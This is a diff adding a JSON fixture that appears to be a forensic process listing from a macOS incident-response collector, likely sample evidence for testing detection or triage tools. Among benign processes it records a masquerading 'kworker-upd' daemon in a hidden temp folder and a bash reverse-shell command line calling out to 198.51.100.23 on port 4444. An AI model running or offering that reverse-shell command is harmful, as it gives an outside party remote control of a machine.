@@ -1,0 +1,106 @@
+{
+  "artifact": "processes",
+  "collected_at": "2026-03-10T12:00:00Z",
+  "errors": [],
+  "notes": [
+    "Processes that exited between ps calls may lack a command line. Absence of a process is not proof it never ran."
+  ],
+  "records": [
+    {
+      "cmdline": [
+        "/sbin/launchd"
+      ],
+      "exe": "/sbin/launchd",
+      "exe_sha256": "740b43734d6a57e7f042c2c527fb3b5cbd63551eb53be8eab39ee9aab8c3dd3e",
+      "name": "launchd",
+      "pid": 1,
+      "ppid": 0,
+      "start_time": "2026-03-09T10:00:00Z",
+      "state": "Ss",
+      "uid": 0,
+      "user": "root",
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/usr/sbin/sshd -D"
+      ],
+      "exe": "/usr/sbin/sshd",
+      "exe_sha256": "c8a17e6b2a54f45f2a51b4dc470651ca0d49f8bb90b4ec3ce7a036fbf7abeab7",
+      "name": "sshd",
+      "pid": 401,
+      "ppid": 1,
+      "start_time": "2026-03-09T10:00:05Z",
+      "state": "Ss",
+      "uid": 0,
+      "user": "root",
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/Applications/Safari.app/Contents/MacOS/Safari"
+      ],
+      "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+      "exe_sha256": "0e9baa0ae2445cb3ee63411fab072dc4470ae0203597ae0a263dcef47f4b3cbf",
+      "name": "Safari",
+      "pid": 602,
+      "ppid": 1,
+      "start_time": "2026-03-10T08:00:01Z",
+      "state": "S",
+      "uid": 501,
+      "user": "analyst",
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "/private/tmp/.cache/kworker-upd --daemon"
+      ],
+      "exe": "/private/tmp/.cache/kworker-upd",
+      "exe_sha256": "ac42db2b771c6400dd73ea1072446ea2af0719b733c12c0907ad76c85c0a4cce",
+      "name": "kworker-upd",
+      "pid": 977,
+      "ppid": 1,
+      "start_time": "2026-03-10T09:30:00Z",
+      "state": "S",
+      "uid": 501,
+      "user": "analyst",
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "mysql --user=app --password=[REDACTED] -h db.example.test"
+      ],
+      "exe": "/usr/bin/mysql",
+      "exe_sha256": "a7cb74c24f32c14115ed6e2bf39db4ade9bb78bb21afa14df47fdd7ad68d0ebd",
+      "name": "mysql",
+      "pid": 1310,
+      "ppid": 602,
+      "start_time": "2026-03-10T10:00:00Z",
+      "state": "S",
+      "uid": 501,
+      "user": "analyst",
+      "visibility": "full"
+    },
+    {
+      "cmdline": [
+        "bash -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"
+      ],
+      "exe": "/bin/bash",
+      "exe_sha256": "7c5e353a84f20a713fe622eeadff4d39324aba152e149441b5e7188818d37e5b",
+      "name": "bash",
+      "pid": 1400,
+      "ppid": 401,
+      "start_time": "2026-03-10T11:00:00Z",
+      "state": "S",
+      "uid": 501,
+      "user": "analyst",
+      "visibility": "full"
+    }
+  ],
+  "schema_version": 1,
+  "sources": [
+    "ps -axo pid=,ppid=,uid=,user=,stat=,lstart=,comm=",
+    "ps -axww -o pid=,command="
+  ],
+  "status": "ok"
+}
